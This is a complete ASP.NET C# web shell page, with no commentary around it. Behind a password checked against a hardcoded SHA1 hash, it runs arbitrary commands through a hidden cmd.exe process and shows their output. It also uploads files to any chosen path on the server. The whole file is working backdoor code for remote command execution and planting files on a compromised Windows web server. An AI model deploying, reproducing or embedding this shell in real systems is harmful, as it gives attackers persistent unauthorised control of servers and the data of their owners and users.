<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Page Language="C#" validateRequest="false" %>
<script runat="server">
protected bool chk(string pass){try{SHA1 sha = new SHA1CryptoServiceProvider();byte[] hash = sha.ComputeHash(Encoding.ASCII.GetBytes(pass));bool res =(BitConverter.ToString(hash).Replace("-", "") == "B5FFC0A8CA30DF286889019C13BDB8A4A1E6E9DB")? true : false;return res;}catch(Exception ex){Label1.Text = ex.Message;return false;}}
protected void Run(object sender, EventArgs e) {
	try{
		if(chk(pass.Text)){
			Process p = new Process();p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
			p.StartInfo.UseShellExecute = false;
			p.StartInfo.RedirectStandardInput = true;
			p.StartInfo.RedirectStandardOutput = true;
			p.StartInfo.RedirectStandardError = true;
			p.StartInfo.CreateNoWindow = true;string strOutput = null;
			p.Start();p.StandardInput.WriteLine(cmd.Text);
			p.StandardInput.WriteLine("exit");strOutput = p.StandardOutput.ReadToEnd();
			p.WaitForExit();p.Close();
			Label1.Text = "<pre color=\"navy\">" + strOutput.Replace("<", "<").Replace(">", ">").Replace(Environment.NewLine, "<br />") +  "</pre>";
			}
	}
	catch(Exception ex){Label1.Text = ex.Message;}
}
protected void Upl(object sender, EventArgs e) {
	if(chk(pass.Text)){ 
		try{
			if ((F1.PostedFile != null ) && ( F1.PostedFile.ContentLength > 0 ) ) {
				string fn = System.IO.Path.GetFileName(F1.PostedFile.FileName);
				string SaveLocation = (abs.Checked) ? (dest.Text +  fn) : Server.MapPath(dest.Text) + "\\" +  fn;
				F1.PostedFile.SaveAs(SaveLocation);
				Label1.Text = "The file has been uploaded: "+SaveLocation;
			}
		}catch(Exception ex){Label1.Text = ex.Message;}
	}
}
</script>
<html xmlns="http://www.w3.org/1999/xhtml"><head id="Head1" runat="server"></head>
<body><form id="Form1" runat="server">
<p><em>locaton: </em><% Response.Write(Server.MapPath(Request.ServerVariables["SCRIPT_NAME"])); %></p>
<asp:TextBox ID="pass" runat="server" Text="" Width="50%" Font-Name="Lucida Console" Font-Size="13" ></asp:TextBox>
<asp:TextBox ID="cmdPath" runat="server" Text="c:\windows\system32\cmd.exe" Width="50%" Font-Name="Lucida Console" Font-Size="13" ></asp:TextBox>


<asp:TextBox ID="cmd" runat="server" Text="" Width="50%" Font-Name="Lucida Console" Font-Size="13" ></asp:TextBox>


<asp:Button ID="BRun" runat="server" OnClick="Run" Text="cmd" Font-Name="Lucida Console" Font-Size="13" />
<hr>
<input type="file" id="F1" runat="server" >
<asp:TextBox ID="dest" runat="server" Text="~"></asp:TextBox>
<asp:TextBox ID="NewName" runat="server" Text=""></asp:TextBox>
<asp:CheckBox id="abs" Text="absolute path" runat="server" />
<asp:Button ID="B1" runat="server" OnClick="Upl" Text="Upload" />
<hr />
<asp:Label ID="Label1" runat="server" Font-Name="Lucida Console" Font-Size="13" ></asp:Label>
</form>
</body></html>
